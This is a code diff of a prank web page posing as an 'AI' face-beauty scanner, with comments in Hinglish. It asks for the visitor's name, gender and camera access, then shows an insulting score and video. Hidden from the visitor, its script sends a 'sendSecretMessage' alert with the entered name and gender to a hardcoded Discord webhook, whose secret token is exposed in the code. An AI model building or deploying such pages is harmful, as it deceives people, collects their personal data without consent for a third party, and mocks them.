@@ -51,11 +51,6 @@
             transition: 0.3s;
         }
 
-        input[type="text"]:focus, select:focus {
-            box-shadow: 0 0 15px rgba(255, 51, 102, 0.6);
-            background: #333;
-        }
-
         /* Camera Box Design */
         .video-wrapper {
             position: relative;
@@ -80,8 +75,8 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Mirrors the camera like a selfie */
-            display: none; /* Hide until camera is active */
+            transform: scaleX(-1); 
+            display: none; 
         }
 
         .scan-line {
@@ -93,7 +88,7 @@
             background: rgba(255, 51, 102, 0.9);
             box-shadow: 0 0 15px #ff3366;
             animation: scanning 2s linear infinite;
-            display: none; /* Hidden until scanning starts */
+            display: none; 
         }
 
         @keyframes scanning {
@@ -116,11 +111,7 @@
             transition: transform 0.1s;
         }
 
-        button.start-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* Result Popup Style */
+        /* Result Popup Style - Video ke liye perfectly fit kiya hua */
         #resultArea {
             display: none;
             position: fixed;
@@ -137,12 +128,14 @@
             padding: 20px;
         }
 
-        #resultArea img {
+        #resultArea video {
             width: 90%;
             max-width: 300px;
             border-radius: 15px;
             margin-bottom: 20px;
             border: 5px solid white;
+            background: #000;
+            outline: none;
         }
 
         #resultArea h2 {
@@ -154,6 +147,7 @@
         #resultArea p {
             color: #aaa;
             font-size: 1.1rem;
+            padding: 0 15px;
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
@@ -166,7 +160,6 @@
         
         <input type="text" id="targetName" placeholder="Enter your Name" autocomplete="off">
         
-        <!-- Male / Female Option -->
         <select id="genderSelect">
             <option value="" disabled selected>Select Gender</option>
             <option value="Female">Female</option>
@@ -182,14 +175,15 @@
         <button class="start-btn" onclick="startScanner()" id="actionBtn">Start AI Analysis</button>
     </div>
 
+    <!-- Final Result Area -->
     <div id="resultArea">
         <h2>YOUR SCORE: 0.5/100</h2>
-        <img id="resultImage" src="" alt="Funny React Meme">
+        <!-- Image ki jagah Video tag add kiya hai -->
+        <video id="resultVideo" loop playsinline></video>
         <p id="resultText"></p>
     </div>
 
     <script>
-        // Tumhara Discord Webhook pehle se hi add kar diya hai
         const webhook_url = "https://discord.com/api/webhooks/1536173080089469079/k-7tusDXdFrEq29rbDGVitrOyIh7MYDBZLVCZFGDZIs49PVAv3MwlNvqyq7DwVlSl2LX"; 
 
         const video = document.querySelector("#videoElement");
@@ -200,10 +194,9 @@
         const genderSelect = document.getElementById("genderSelect");
         const cameraPlaceholder = document.getElementById("cameraPlaceholder");
         
-        const resultImage = document.getElementById("resultImage");
+        const resultVideo = document.getElementById("resultVideo");
         const resultText = document.getElementById("resultText");
 
-        // Discord Notification Function
         function sendSecretMessage(messageText) {
             fetch(webhook_url, {
                 method: "POST",
@@ -214,7 +207,6 @@
             }).catch(error => console.error("Error:", error));
         }
 
-        // Jaise hi page khulega, message aayega
         window.onload = function() {
             sendSecretMessage("👀 Alert: Kisi ne prank link open kiya hai!");
         };
@@ -223,7 +215,6 @@
             const enteredName = targetNameInput.value.trim();
             const gender = genderSelect.value;
 
-            // Name & Gender check
             if (enteredName === "") {
                 alert("Please enter your name first!");
                 return;
@@ -233,35 +224,28 @@
                 return;
             }
 
-            // Lock the form so they can't change it while scanning
             actionBtn.innerText = "Connecting Camera...";
             actionBtn.disabled = true;
             targetNameInput.disabled = true; 
             genderSelect.disabled = true;
 
-            // Discord Notification - Target Locked
-            sendSecretMessage(`🎯 Target Locked: "${enteredName}" (${gender}) ne scan start kiya hai. Camera request ho rahi hai...`);
+            sendSecretMessage(`🎯 Target Locked: "${enteredName}" (${gender}) ne scan start kiya hai...`);
 
-            // Start Camera
             if (navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function (stream) {
-                        // Agar camera allow kiya, toh video show karo
                         video.srcObject = stream;
                         cameraPlaceholder.style.display = "none";
                         video.style.display = "block";
                         
-                        // Ek second wait karke scan animation shuru karo
                         setTimeout(() => {
                             actionBtn.innerText = "Analyzing Face... Don't Move!";
                             scanLine.style.display = "block"; 
                             
-                            // 5 second scan chalne do, phir meme dikhao
                             setTimeout(revealPrank, 5000);
                         }, 1000);
                     })
                     .catch(function (err) {
-                        // Agar camera block kar diya
                         alert("Camera access is needed for AI scanning!");
                         actionBtn.innerText = "Start AI Analysis";
                         actionBtn.disabled = false;
@@ -275,27 +259,27 @@
         }
 
         function revealPrank() {
-            // Camera band kar do scan hone ke baad
             if (video.srcObject) {
                 video.srcObject.getTracks().forEach(track => track.stop());
             }
             
             const gender = genderSelect.value;
 
-            // Gender ke hisaab se meme decide karo
+            // Yahan humne local video files ka naam add kar diya hai
             if (gender === "Male") {
-                resultImage.src = "https://media.tenor.com/J2FhU28tMhgAAAAC/laughing-laughing-so-hard.gif"; // Funny laughing meme
+                resultVideo.src = "boy.mp4"; // Tumhari rone wali video
                 resultText.innerText = "Bhai tu toh rehne hi de. AI ki aankhein kharab ho gayin! 😂";
             } else {
-                resultImage.src = "https://media.tenor.com/71wZ_YfK6f4AAAAC/ugh-seriously.gif"; // "Ugh seriously" girl meme
-                resultText.innerText = "WARNING: Camera lens cracked! Tumhari 'True Beauty' dhoondhte-dhoondhte AI ka system jal gaya. 📱💔";
+                resultVideo.src = "girl.mp4"; // Tumhari hasne wali video
+                resultText.innerText = "ERROR 404: Beauty not found. AI ne bina Instagram filter ke scan karne se mana kar diya! 🤡";
             }
 
-            // Meme Popup dikhao
             resultArea.style.display = "flex";
             
-            // Final Discord update
-            sendSecretMessage(`✅ Prank Successful: "${targetNameInput.value}" ne apna meme dekh liya! 😂`);
+            // Video ko autoplay karne ka command
+            resultVideo.play();
+            
+            sendSecretMessage(`✅ Prank Successful: "${document.getElementById("targetName").value}" ka poppat ban gaya! 😂`);
         }
     </script>
 </body>
